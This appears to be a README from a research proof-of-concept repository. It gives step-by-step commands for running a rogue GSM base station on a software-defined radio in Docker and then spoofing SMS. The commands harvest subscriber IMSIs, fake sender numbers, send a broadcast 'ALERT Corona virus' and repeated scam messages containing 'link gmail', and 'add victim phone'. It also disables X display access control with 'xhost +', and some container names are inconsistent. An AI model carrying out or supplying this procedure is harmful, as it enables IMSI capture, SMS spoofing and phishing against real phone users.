# Installing on USRP
# In Terminal 1
## Launching container
```
apt update
```
## Installing CPUPOWER

```
apt-get install linux-tools-common
```
```
apt-get install linux-tools-generic
```
(installing also linux-tools--tools-generic by taping command cpupower)

```
cpupower frequency-set -g performance 
```
## Preparing USRP
```
lsusb
```
Verify if this log exist </br>
`Bus 001 Device 006: ID 0456:b673 Analog Devices, Inc. LibIIO based AD9363 Software Defined Radio [ADALM-PLUTO]`  </br>

Launch : 
```
echo 'SUBSYSTEM=="usb", ATTR{idVendor}=="0456", ATTR{idProduct}=="b673", MODE="666"' | sudo tee /etc/udev/rules.d/90-libiio_pluto.rules
```
Then, 
```
sudo udevadm control --reload-rules
```
```
sudo udevadm trigger
```
Unplug and replug USRP </br>
Find the IP address of USRP </br> </br>

## Preparing Dockerfile
```
apt-get install wget docker.io
```

```
mkdir btsusrp
```
```
cd btsusrp
```
```
wget https://raw.githubusercontent.com/SitrakaResearchAndPOC/Bulg2g_allsdr_docker/refs/heads/main/usrp/Dockerfile
```
## Building images

```
docker build -t btsusrp:v1 .
```
```
docker rm -f btsusrp
```
```
docker run -tid --privileged \
  --cgroupns=host \
  --net=host \
  -v /sys/fs/cgroup:/sys/fs/cgroup:rw \
  -v /dev:/dev \
  -v /dev/bus/usb:/dev/bus/usb \
  -v /tmp/.X11-unix:/tmp/.X11-unix:ro \
  -v $XAUTHORITY:/home/user/.Xauthority:ro \
  --tmpfs /run \
  --tmpfs /run/lock \
  --env="DISPLAY=$DISPLAY" \
  --env="LC_ALL=C.UTF-8" \
  --env="LANG=C.UTF-8" \
  --name btsusrp \
  --hostname btsusrp \
  btsusrp:v1
```
If problem authority replace the  `-v $XAUTHORITY:/home/user/.Xauthority:ro` by :  `-v /root/.Xauthority:/home/user/.Xauthority:ro`
```
xhost +
```

## Testing USRP driver
```
docker exec -ti btsusrp bash -c 'uhd_usrp_probe'
```
```
docker exec -ti btsusrp bash -c 'uhd_find_devices'
```

## Launching transceiver
```
docker exec -ti btusrp bash -c 'osmo-trx-uhd -C /etc/osmocom/osmo-trx-uhd.cfg'
```
Tape ctrl+shift+T   </br>

# In terminal 2
launch service   :
```
docker exec -ti btsusrp bash -c 'cd osmo-nitb-scripts && bash install_services.sh'
```
```
docker exec -ti usrp python3 osmo-nitb-scripts/main_uhd_spoof.py
```
Tape ctrl+shift+T   </br>

# In terminal 3
## Testing USRP SpoofScript1
```
docker exec -ti btsusrp bash osmo-nitb-scripts/scripts_spoof1/finding_imsi_extenstion.sh```
```
You could find imsi and extension </br>
let's see for example IMSI as `646040222463674` and EXTENSION as `126` </br>
```
docker exec -ti btsusrp  bash osmo-nitb-scripts/scripts_spoof1/set_imsi_extension.sh <IMSI> 0341220590
```
Verify by if the association is correct let's see for example imsi as 646040222463674 and extension as 0341220590
```
docker exec -ti btsusrp bash osmo-nitb-scripts/scripts_spoof1/finding_imsi_extenstion.sh
```
Tape `*#*#4636#*#*` and choose GSM only on your Android phone </br>
Search GSM network (on your phone), associate with PLMN MCC `001` && MNC `01` </br>
Tape `*#001#` for finding your phone number (extension with osmo-bts) </br>
```
docker exec -ti btsusrp  python2 osmo-nitb-scripts/scripts_spoof1/sending_sms_spoof_byextension.py
```
Sending for all extensions in osmo-bts
```
docker exec -ti btsusrp python2 osmo-nitb-scripts/scripts_spoof1/sending_sms_broadcast.py 
```
log should be : subscriber extension 0341220590 sms sender extension 0341220590 send ALERT Corona virus

## Testing USRP SpoofScript2
```
docker exec -ti btsusrp python2 osmo-nitb-scripts/scripts_spoof2/show_subscribers.py 
```
You could find imsi and extension Create a virtual extension `0341220590` and send sms to existing EXTENSION eg : `164`
```
docker exec -ti btsusrp python2 osmo-nitb-scripts/scripts_spoof2/sms_send_source_dest_msg.py 0341220590 <EXTENSION> "link gmail"
```
You could find imsi and extension
```
docker exec -ti btsusrp python2 osmo-nitb-scripts/scripts_spoof2/show_subscribers.py 
```
Creating many extensions for sending a scam sms repeat 3 times
```
docker exec -ti btsusrp python2 osmo-nitb-scripts/scripts_spoof2/sms_spam.py <EXTENSION> 3 "link gmail"
```
You could find imsi and extension
```
docker exec -ti btsusrp python2 osmo-nitb-scripts/scripts_spoof2/show_subscribers.py 
```
Sending a broadcast sms by using a virtual number as extension `165`
```
docker exec -ti btsusrp  python2 osmo-nitb-scripts/scripts_spoof2/sms_broadcast.py 165 "link gmail"
```
You could find imsi and extension
```
docker exec -ti btsusrp  python2 osmo-nitb-scripts/scripts_spoof2/show_subscribers.py
```

## Testing USRP Fake SMS Sender
# In terminal 1
```
docker exec -ti btsusrp bash -c 'uhd_usrp_probe'
```
```
docker exec -ti btsusrp bash -c 'uhd_find_devices'
```

## Launching transceiver
```
docker exec -ti btusrp bash -c 'osmo-trx-uhd -C /etc/osmocom/osmo-trx-uhd.cfg'
```

# In terminal 2

launch service   :
```
docker exec -ti btsusrp bash -c 'cd osmo-nitb-scripts && bash install_services.sh'
```
```
docker exec -ti btsusrp python3 osmo-nitb-scripts/main_uhd.py
```
Add victim phone and tape Tape ctrl+shift+T

# In terminal 3

```
docker exec -ti btsusrp  cat osmo-nitb-scripts/interact.py
```
Change the the paramater default for add_argument in `/var/lib/osmocom/hlr.sqlite3`
```
docker exec -ti btsusrp  python3 osmo-nitb-scripts/interact.py -c /config.json
```



